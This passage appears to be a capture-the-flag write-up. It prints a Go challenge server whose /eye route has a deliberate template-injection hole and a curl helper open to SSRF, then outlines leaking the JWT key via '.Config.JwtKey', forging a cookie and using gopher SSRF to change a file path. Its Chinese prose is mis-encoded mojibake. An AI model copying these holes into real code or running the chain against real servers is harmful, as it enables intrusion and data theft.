</span></span><span class="line"><span class="cl">	<span class="nx">JwtKey</span><span class="p">:</span>        <span class="nf">RandString</span><span class="p">(</span><span class="mi">64</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="nx">SignaturePath</span><span class="p">:</span> <span class="s">&#34;./sign.txt&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="nx">Helper</span><span class="p">)</span> <span class="nf">Curl</span><span class="p">(</span><span class="nx">url</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Curl:&#34;</span><span class="p">,</span> <span class="nx">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">cmd</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="s">&#34;curl&#34;</span><span class="p">,</span> <span class="s">&#34;-fsSL&#34;</span><span class="p">,</span> <span class="s">&#34;--&#34;</span><span class="p">,</span> <span class="nx">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">cmd</span><span class="p">.</span><span class="nf">CombinedOutput</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Error: curl:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="s">&#34;error&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="s">&#34;ok&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">routeIndex</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">http</span><span class="p">.</span><span class="nf">ServeFile</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">r</span><span class="p">,</span> <span class="s">&#34;views/index.html&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">routeEye</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">input</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">Query</span><span class="p">().</span><span class="nf">Get</span><span class="p">(</span><span class="s">&#34;input&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">input</span> <span class="o">==</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">input</span> <span class="p">=</span> <span class="s">&#34;{{ .User }}&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// get template
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">content</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="s">&#34;views/eye.html&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;error&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nx">tmplStr</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Replace</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">content</span><span class="p">),</span> <span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="nx">input</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">tmpl</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">template</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="s">&#34;eye&#34;</span><span class="p">).</span><span class="nf">Parse</span><span class="p">(</span><span class="nx">tmplStr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">input</span> <span class="o">:=</span> <span class="s">&#34;[error]&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="nx">tmplStr</span> <span class="p">=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Replace</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">content</span><span class="p">),</span> <span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="nx">input</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="nx">tmpl</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">template</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="s">&#34;eye&#34;</span><span class="p">).</span><span class="nf">Parse</span><span class="p">(</span><span class="nx">tmplStr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;error&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// get user from cookie
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">user</span> <span class="o">:=</span> <span class="s">&#34;PangBai&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">token</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nf">Cookie</span><span class="p">(</span><span class="s">&#34;token&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">token</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Cookie</span><span class="p">{</span><span class="nx">Name</span><span class="p">:</span> <span class="s">&#34;token&#34;</span><span class="p">,</span> <span class="nx">Value</span><span class="p">:</span> <span class="s">&#34;&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nx">o</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">validateJwt</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">Value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">user</span> <span class="p">=</span> <span class="nx">o</span><span class="p">.</span><span class="nx">Name</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// renew token
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">newToken</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">genJwt</span><span class="p">(</span><span class="nx">Token</span><span class="p">{</span><span class="nx">Name</span><span class="p">:</span> <span class="nx">user</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;error&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nx">http</span><span class="p">.</span><span class="nf">SetCookie</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Cookie</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Name</span><span class="p">:</span>  <span class="s">&#34;token&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Value</span><span class="p">:</span> <span class="nx">newToken</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// render template
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">helper</span> <span class="o">:=</span> <span class="nx">Helper</span><span class="p">{</span><span class="nx">User</span><span class="p">:</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">Config</span><span class="p">:</span> <span class="nx">config</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nx">err</span> <span class="p">=</span> <span class="nx">tmpl</span><span class="p">.</span><span class="nf">Execute</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">helper</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;[error]&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">routeFavorite</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">r</span><span class="p">.</span><span class="nx">Method</span> <span class="o">==</span> <span class="nx">http</span><span class="p">.</span><span class="nx">MethodPut</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// ensure only localhost can access
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">requestIP</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">RemoteAddr</span><span class="p">[:</span><span class="nx">strings</span><span class="p">.</span><span class="nf">LastIndex</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">RemoteAddr</span><span class="p">,</span> <span class="s">&#34;:&#34;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Request IP:&#34;</span><span class="p">,</span> <span class="nx">requestIP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">requestIP</span> <span class="o">!=</span> <span class="s">&#34;127.0.0.1&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">requestIP</span> <span class="o">!=</span> <span class="s">&#34;[::1]&#34;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">w</span><span class="p">.</span><span class="nf">WriteHeader</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusForbidden</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nx">w</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&#34;Only localhost can access&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">token</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nf">Cookie</span><span class="p">(</span><span class="s">&#34;token&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">o</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">validateJwt</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">Value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">w</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">o</span><span class="p">.</span><span class="nx">Name</span> <span class="o">==</span> <span class="s">&#34;PangBai&#34;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">w</span><span class="p">.</span><span class="nf">WriteHeader</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusAccepted</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nx">w</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&#34;Hello, PangBai!&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">o</span><span class="p">.</span><span class="nx">Name</span> <span class="o">!=</span> <span class="s">&#34;Papa&#34;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">w</span><span class="p">.</span><span class="nf">WriteHeader</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusForbidden</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nx">w</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&#34;You cannot access!&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">body</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadAll</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">Body</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;error&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="nx">config</span><span class="p">.</span><span class="nx">SignaturePath</span> <span class="p">=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="nx">w</span><span class="p">.</span><span class="nf">WriteHeader</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusOK</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="nx">w</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&#34;ok&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// render
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="nx">tmpl</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">template</span><span class="p">.</span><span class="nf">ParseFiles</span><span class="p">(</span><span class="s">&#34;views/favorite.html&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;error&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">sig</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="nx">config</span><span class="p">.</span><span class="nx">SignaturePath</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;Failed to read signature files: &#34;</span><span class="o">+</span><span class="nx">config</span><span class="p">.</span><span class="nx">SignaturePath</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">err</span> <span class="p">=</span> <span class="nx">tmpl</span><span class="p">.</span><span class="nf">Execute</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nb">string</span><span class="p">(</span><span class="nx">sig</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;[error]&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">r</span> <span class="o">:=</span> <span class="nx">mux</span><span class="p">.</span><span class="nf">NewRouter</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="nx">routeIndex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/eye&#34;</span><span class="p">,</span> <span class="nx">routeEye</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/favorite&#34;</span><span class="p">,</span> <span class="nx">routeFavorite</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nf">PathPrefix</span><span class="p">(</span><span class="s">&#34;/assets&#34;</span><span class="p">).</span><span class="nf">Handler</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nf">StripPrefix</span><span class="p">(</span><span class="s">&#34;/assets&#34;</span><span class="p">,</span> <span class="nf">noDirList</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nf">FileServer</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nf">Dir</span><span class="p">(</span><span class="s">&#34;./assets&#34;</span><span class="p">)))))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Starting server on :8000&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">http</span><span class="p">.</span><span class="nf">ListenAndServe</span><span class="p">(</span><span class="s">&#34;:8000&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨/eyeä¸­æœ‰æ¨¡æ¿æ³¨å…¥ã€å¯ä»¥é€šè¿‡<code>.Config.JwtKey</code>æŸ¥çœ‹JWTå¯†é’¥</p>
<p>å…·ä½“è§£é‡Šå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">GoLang</span><span class="w"> </span><span class="err">æ¨¡æ¿ä¸­çš„ä¸Šä¸‹æ–‡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">`</span><span class="n">tmpl</span><span class="p">.</span><span class="n">Execute</span><span class="o">`</span><span class="w"> </span><span class="err">å‡½æ•°ç”¨äºå°†</span><span class="w"> </span><span class="n">tmpl</span><span class="w"> </span><span class="err">å¯¹è±¡ä¸­çš„æ¨¡æ¿å­—ç¬¦ä¸²è¿›è¡Œæ¸²æŸ“ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥çš„æ˜¯ä¸€ä¸ª</span><span class="w"> </span><span class="n">Writer</span><span class="w"> </span><span class="err">å¯¹è±¡ï¼Œåé¢æ˜¯ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œåœ¨æ¨¡æ¿å­—ç¬¦ä¸²ä¸­ï¼Œå¯ä»¥ä½¿ç”¨</span><span class="w"> </span><span class="o">`</span><span class="err">{{</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="err">}}</span><span class="o">`</span><span class="w"> </span><span class="err">è·å–æ•´ä¸ªä¸Šä¸‹æ–‡ï¼Œæˆ–ä½¿ç”¨</span><span class="w"> </span><span class="o">`</span><span class="err">{{</span><span class="w"> </span><span class="p">.</span><span class="n">A</span><span class="p">.</span><span class="n">B</span><span class="w"> </span><span class="err">}}</span><span class="o">`</span><span class="w"> </span><span class="err">è¿›è¡Œå±‚çº§è®¿é—®ã€‚è‹¥ä¸Šä¸‹æ–‡ä¸­å«æœ‰å‡½æ•°ï¼Œä¹Ÿæ”¯æŒ</span><span class="w"> </span><span class="o">`</span><span class="err">{{</span><span class="w"> </span><span class="p">.</span><span class="n">Func</span><span class="w"> </span><span class="s2">&#34;param&#34;</span><span class="w"> </span><span class="err">}}</span><span class="o">`</span><span class="w"> </span><span class="err">çš„æ–¹å¼ä¼ å…¥å˜é‡ã€‚å¹¶ä¸”è¿˜æ”¯æŒç®¡é“ç¬¦è¿ç®—ã€‚</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">åœ¨æœ¬é¢˜ä¸­ï¼Œç”±äº</span><span class="w"> </span><span class="o">`</span><span class="n">utils</span><span class="p">.</span><span class="n">go</span><span class="o">`</span><span class="w"> </span><span class="err">å®šä¹‰çš„</span><span class="w"> </span><span class="o">`</span><span class="n">Stringer</span><span class="o">`</span><span class="w"> </span><span class="err">å¯¹è±¡ä¸­çš„</span><span class="w"> </span><span class="o">`</span><span class="n">String</span><span class="o">`</span><span class="w"> </span><span class="err">æ–¹æ³•ï¼Œå¯¹ç»§æ‰¿ä»–çš„æ¯ä¸€ä¸ª</span><span class="w"> </span><span class="n">struct</span><span class="err">ï¼Œåœ¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶éƒ½ä¼šè¿”å›</span><span class="w"> </span><span class="o">`</span><span class="p">[</span><span class="n">struct</span><span class="p">]</span><span class="o">`</span><span class="err">ï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨</span><span class="w"> </span><span class="o">`</span><span class="err">{{</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="err">}}</span><span class="o">`</span><span class="w"> </span><span class="err">è¿”å›å…¨å±€çš„ä¸Šä¸‹æ–‡ç»“æ„ä¼šè¿”å›</span><span class="w"> </span><span class="o">`</span><span class="p">[</span><span class="n">struct</span><span class="p">]</span><span class="o">`</span><span class="p">.</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨Configè¿™ä¸ªç»“æ„ä½“ä¸­æœ‰JwtKeyï¼Œæ‰€ä»¥å¯ä»¥ç”¨<code>.Config.JwtKey</code>æ³„éœ²å‡ºå¯†é’¥</p>
<p><img src="/p/newstarctf2024/image-20250706150253367.png"
	width="2394"
	height="638"
	srcset="/p/newstarctf2024/image-20250706150253367_hu17918053950979406071.png 480w, /p/newstarctf2024/image-20250706150253367_hu4518983499430450956.png 1024w"
	loading="lazy"
	
		alt="image-20250706150253367"
	
	
		class="gallery-image" 
		data-flex-grow="375"
		data-flex-basis="900px"
	
></p>
<p>ç„¶ååœ¨/favoriteä¸­ï¼Œé¡µé¢å³ä¸‹è§’æœ‰ä¸€ä¸ªè¯»æ–‡ä»¶çš„æ“ä½œï¼Œæˆ‘ä»¬ç”¨PUTè¯·æ±‚å¯ä»¥ä¿®æ”¹æ–‡ä»¶è¯»å–çš„è·¯å¾„ï¼Œä½†æ˜¯éœ€è¦æºå¸¦Nameä¸ºPapaçš„JWTcookieã€‚</p>
<p>æ‰€ä»¥ï¼Œå¤§è‡´çš„æ€è·¯å°±æ˜¯åˆ©ç”¨æ³„éœ²çš„JWTkeyä¼ªé€ cookieï¼Œç„¶åå¯¹<code>/favorite</code>å‘èµ·PUTè¯·æ±‚ä¿®æ”¹è·¯å¾„ï¼Œç„¶åè®¿é—®<code>/favorite</code>è·å–flagã€‚</p>
<p>ä½†æ˜¯ï¼Œ/favoriteçš„è¯·æ±‚å¼ºåˆ¶è¦æ±‚æ˜¯æœ¬åœ°ï¼Œåˆè¦å‘é€putè¯·æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰“Gopheråè®®çš„ssrfã€‚ç„¶åï¼Œåœ¨/eyeä¸­å®šä¹‰äº†ä¸€ä¸ªCurlçš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥è¿™é‡Œè¿›è¡Œssrf</p>
<p>æŠ“åŒ…çš„JWTæ˜¯æœ‰æ—¶é—´æˆ³çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ä¼ªé€ çš„ä¸éœ€è¦</p>
